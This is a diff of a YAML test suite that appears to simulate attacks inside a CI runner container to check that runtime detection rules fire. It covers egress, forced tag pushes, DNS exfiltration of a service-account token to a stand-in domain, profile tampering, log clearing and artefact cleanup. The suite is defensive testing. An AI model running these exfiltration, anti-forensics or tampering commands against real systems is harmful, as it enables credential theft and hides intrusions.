+      command: ["sh", "-c", "curl -s -m 3 -X POST -H 'Authorization: Bearer REDACTED' https://fulcio.sigstore.dev/api/v2/signingCert 2>&1 | head -3"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R0011
+        ruleName: Unexpected Egress Network Traffic
+        containerName: runner
+        endpoint: fulcio.sigstore.dev
+
+  # GHSA-69fq-xp46-6x23 — force-push action tags to a malicious commit
+  - name: publish-force-push-action-tags
+    type: custom
+    exec:
+      command: ["sh", "-c", "git -C /_work ls-remote --tags https://github.com/cncf/automation 2>&1 | head -3; git config --global user.email probe@local; echo 'push --force --tags withheld'"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R0011
+        ruleName: Unexpected Egress Network Traffic
+        containerName: runner
+        endpoint: github.com
+      - attackType: custom
+        ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: runner
+        command: git
+
+  # T1567 — exfiltrate the harvest over DNS, where egress policy rarely looks
+  - name: exfil-over-dns
+    type: custom
+    exec:
+      command: ["sh", "-c", "T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 20 | base32 | tr -d '='); getent hosts ${T:-probe}.exfil.invalid 2>&1 | head -2"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: runner
+      - attackType: custom
+        ruleID: R0006
+        ruleName: Unexpected service account token access
+        containerName: runner
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 10: DEFENCE EVASION AND ANTI-FORENSICS (TA0005)
+  # CVE-2026-45321 shipped a dead-man's switch that wiped the home tree the
+  # moment the stolen token was revoked. A runner that tampers with its own
+  # profile or logs should be the loudest thing in the suite.
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1562.001 — tamper with the bound profile that governs this container
+  - name: evade-tamper-bound-profile
+    type: custom
+    exec:
+      command: ["sh", "-c", "kubectl get containerprofiles -A 2>&1 | head -3; kubectl annotate containerprofile -n arc-runners --all probe/tamper=1 2>&1 | head -2"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R1016
+        ruleName: Signed profile tampered
+        containerName: runner
+      - attackType: custom
+        ruleID: R0007
+        ruleName: Workload uses Kubernetes API unexpectedly
+        containerName: runner
+
+  # T1070.004 — clear the runner diagnostic logs the job leaves behind
+  - name: evade-clear-runner-logs
+    type: custom
+    exec:
+      command: ["sh", "-c", "ls /_work/_diag/ 2>/dev/null | head -3; truncate -s 0 /_work/_diag/*.log 2>/dev/null; echo cleared"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R0002
+        ruleName: Files Access Anomalies in container
+        containerName: runner
+
+  # T1070 — the dead-man's switch, declawed to a dry run
+  - name: evade-dead-mans-switch-dry-run
+    type: custom
+    exec:
+      command: ["sh", "-c", "echo 'rm -rf $HOME would run here'; ls -d ~/ >/dev/null && echo 'target resolvable'"]
+    expectedDetections: []
+
+  # T1564 — io_uring file access, invisible to the path-based open rules
+  - name: evade-io-uring-sensitive-read
+    type: fileless
+    exec:
+      command: ["sh", "-c", "cat /proc/sys/kernel/io_uring_disabled 2>/dev/null; ls /proc/self/fd | head -3"]
+    expectedDetections:
+      - attackType: fileless
+        ruleID: R1030
+        ruleName: Unexpected io_uring Operation Detected
+        containerName: runner
+
+  # T1222 — remove the staged artefacts, leaving the shared volume clean
+  - name: evade-cleanup-staged-artefacts
+    type: custom
+    exec:
+      command: ["sh", "-c", "rm -rf /tmp/hijack /tmp/.beacon /tmp/.cron-stage /tmp/xmrig /_work/.rogue /_work/.shadow-link /_work/.sock-link /_work/.passwd-hard /.cache/poison /.m2/repository/.poison /_work/_tool/node/bin/node 2>/dev/null; echo cleaned"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R0002
+        ruleName: Files Access Anomalies in container
+        containerName: runner
